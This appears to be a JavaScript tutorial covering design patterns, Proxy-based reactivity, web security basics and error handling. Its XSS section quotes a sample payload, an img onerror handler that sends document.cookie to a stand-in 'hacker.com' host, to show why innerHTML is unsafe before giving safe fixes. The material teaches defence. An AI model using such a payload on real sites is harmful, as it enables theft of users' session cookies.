## 1. Production JavaScript Design Patterns

### 1.1 Singleton Pattern
Ensures a class has only **one instance** and provides a global access point to it.

```javascript
class DatabaseConnection {
  constructor() {
    if (DatabaseConnection.instance) {
      return DatabaseConnection.instance; // Return existing instance
    }
    
    this.connectionString = "mongodb://localhost:27017/app";
    DatabaseConnection.instance = this;
  }

  connect() {
    console.log(`Connected to ${this.connectionString}`);
  }
}

const db1 = new DatabaseConnection();
const db2 = new DatabaseConnection();
console.log(db1 === db2); // true! Both references point to exact same instance
```

### 1.2 Observer / Pub-Sub Pattern (Handwritten `EventEmitter`)
Allows objects to subscribe to events and react when events are emitted asynchronously.

```javascript
class EventEmitter {
  constructor() {
    this.events = new Map(); // Map of eventName -> Array of listener callbacks
  }

  on(eventName, listener) {
    if (!this.events.has(eventName)) {
      this.events.set(eventName, []);
    }
    this.events.get(eventName).push(listener);
    
    // Return unsubscribe function
    return () => this.off(eventName, listener);
  }

  off(eventName, listenerToRemove) {
    if (!this.events.has(eventName)) return;
    
    const listeners = this.events.get(eventName).filter(
      listener => listener !== listenerToRemove
    );
    this.events.set(eventName, listeners);
  }

  emit(eventName, ...args) {
    if (!this.events.has(eventName)) return;

    this.events.get(eventName).forEach(listener => {
      listener.apply(this, args);
    });
  }
}

// Testing custom EventEmitter
const emitter = new EventEmitter();
const unsubscribe = emitter.on("userLoggedIn", (user) => {
  console.log(`Welcome notification sent to ${user.name}`);
});

emitter.emit("userLoggedIn", { name: "Sarah" }); // Welcome notification sent to Sarah
unsubscribe(); // Cleanup
emitter.emit("userLoggedIn", { name: "Sarah" }); // Nothing happens
```

## 2. Metaprogramming: Proxy & Reflect API

The `Proxy` object wraps another object and intercepts fundamental operations (getting properties, setting properties, function calls).

### 2.1 Building a Minimal Reactive Engine (Vue 3 Style)

```javascript
function createReactiveObject(target, onChange) {
  return new Proxy(target, {
    get(target, prop, receiver) {
      console.log(`[READ PROPERTY]: ${String(prop)}`);
      const value = Reflect.get(target, prop, receiver);
      // Handle nested object reactivity recursively
      if (typeof value === "object" && value !== null) {
        return createReactiveObject(value, onChange);
      }
      return value;
    },

    set(target, prop, value, receiver) {
      const oldValue = target[prop];
      if (oldValue !== value) {
        console.log(`[MUTATION]: ${String(prop)} changed from ${oldValue} to ${value}`);
        const success = Reflect.set(target, prop, value, receiver);
        onChange(prop, value); // Trigger UI update / side effect!
        return success;
      }
      return true;
    },

    deleteProperty(target, prop) {
      console.log(`[DELETE]: ${String(prop)}`);
      return Reflect.deleteProperty(target, prop);
    }
  });
}

// Test Reactivity Engine
const state = createReactiveObject({ count: 0, user: { name: "Alex" } }, (key, val) => {
  console.log(`UI re-rendered due to change in ${key}`);
});

state.count++; 
// [READ PROPERTY]: count
// [MUTATION]: count changed from 0 to 1
// UI re-rendered due to change in count
```

## 3. Web Security Fundamentals for JS Engineers

### 3.1 Cross-Site Scripting (XSS) Prevention
XSS occurs when an attacker injects malicious client-side JavaScript into a web application.

- **Stored XSS**: Malicious script saved in database (e.g. comment field) and rendered to users.
- **Reflected XSS**: Malicious script passed via URL query params.
- **DOM-Based XSS**: Vulnerable JS code reads untrusted input and writes it directly to DOM via `innerHTML` or `eval()`.

```javascript
// VULNERABLE: Direct innerHTML assignment
const userInput = "<img src='x' onerror='fetch(\"http://hacker.com/steal?cookie=\" + document.cookie)'>";
document.querySelector("#comment").innerHTML = userInput; // Executes malicious JS!

// SECURE: Use textContent for plain text
document.querySelector("#comment").textContent = userInput; // Escaped safely as plain text!

// SECURE: Sanitizing HTML when rich HTML rendering is needed
// Use verified libraries like DOMPurify:
// document.querySelector("#comment").innerHTML = DOMPurify.sanitize(userInput);
```

### 3.2 Cross-Site Request Forgery (CSRF)
An attacker tricks an authenticated user's browser into sending unauthorized requests to a target website where user is logged in.

**Prevention**:
- Use **SameSite Cookies** (`SameSite=Strict` or `SameSite=Lax`).
- Use **Anti-CSRF Tokens** sent in custom headers (`X-CSRF-Token`) for state-changing requests (`POST`, `PUT`, `DELETE`).

### 3.3 CORS (Cross-Origin Resource Sharing)
CORS is a browser security mechanism that restricts cross-origin HTTP requests.

- Browser sends an HTTP **Preflight `OPTIONS` request** before complex cross-origin requests (`PUT`, `DELETE`, custom headers).
- Server responds with header: `Access-Control-Allow-Origin: https://trusted-domain.com`.

## 4. Advanced Production Error Handling

### 4.1 Custom Error Subclasses
Creating custom domain-specific errors improves debugging and error handling logic.

```javascript
class BaseError extends Error {
  constructor(message, statusCode) {
    super(message);
    this.name = this.constructor.name;
    this.statusCode = statusCode;
    Error.captureStackTrace(this, this.constructor);
  }
}

class ValidationError extends BaseError {
  constructor(message) {
    super(message, 400);
  }
}

class NotFoundError extends BaseError {
  constructor(message = "Resource not found") {
    super(message, 404);
  }
}

// Usage
try {
  throw new ValidationError("Invalid email address format");
} catch (err) {
  if (err instanceof ValidationError) {
    console.error(`[${err.statusCode}] Client Error: ${err.message}`);
  }
}
```

### 4.2 Global Unhandled Rejection Listeners
Catches unhandled Promise rejections that escape `try/catch` blocks.

```javascript
// Browser
window.addEventListener("unhandledrejection", (event) => {
  console.error("Unhandled promise rejection caught globally:", event.reason);
  // Send telemetry alert to monitoring server (Sentry/Datadog)
});

// Node.js
process.on("unhandledRejection", (reason, promise) => {
  console.error("Unhandled Rejection at:", promise, "reason:", reason);
});
```
